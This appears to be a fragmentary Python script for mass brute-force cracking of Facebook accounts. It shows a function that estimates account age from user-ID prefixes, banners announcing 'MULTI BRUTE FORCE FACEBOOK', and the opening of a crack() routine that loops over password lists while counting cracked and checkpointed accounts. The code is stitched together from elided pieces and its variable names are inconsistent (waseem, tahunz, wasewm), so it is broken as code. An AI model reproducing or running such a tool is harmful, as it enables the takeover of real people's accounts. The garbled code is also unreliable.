...
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :waseem = '2009'
		elif fx[:9] in ['100000000']       :waseem= '2009'
		elif fx[:8] in ['10000000']        :waseem = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :waseem = '2010-2011'
		elif fx[:6] in ['100002','100003'] :waseem = '2011-2012'
		elif fx[:6] in ['100004']          :waseem = '2012-2013'
		elif fx[:6] in ['100005','100006'] :waseem= '2013-2014'
		elif fx[:6] in ['100007','100008'] :waseem = '2014-2015'
		elif fx[:6] in ['100009']          :waseem = '2015'
		elif fx[:5] in ['10001']           :waseem = '2015-2016'
		elif fx[:5] in ['10002']           :waseem = '2016-2017'
		elif fx[:5] in ['10003']           :waseem = '2018'
		elif fx[:5] in ['10004']           :waseem = '2019'
		elif fx[:5] in ['10005']           :wasewm = '2020'
		elif fx[:5] in ['10006','10007','10008']:waseem = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		waseem = '2008-2009'
	elif len(fx)==8:
...
─────────────────── 
   ...
   {S}•{Y}•{D}• {P}MULTI BRUTE FORCE FACEBOOK {S}•{Y}•{D}•""")
def logo2():
	return str(f"""
╔╦═╦╗╔══╗╔══╗╔═╗╔═╗
║║║║║║╔╗║║══╣║║║║║║
...
{S}>{Y}>{D}> {P}CHECKING FOR LOGIN {S}>{Y}>{D}>""")
...
def crack(idf,pwx,url,awal):
	...
	print(f"\r {NOMAN} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
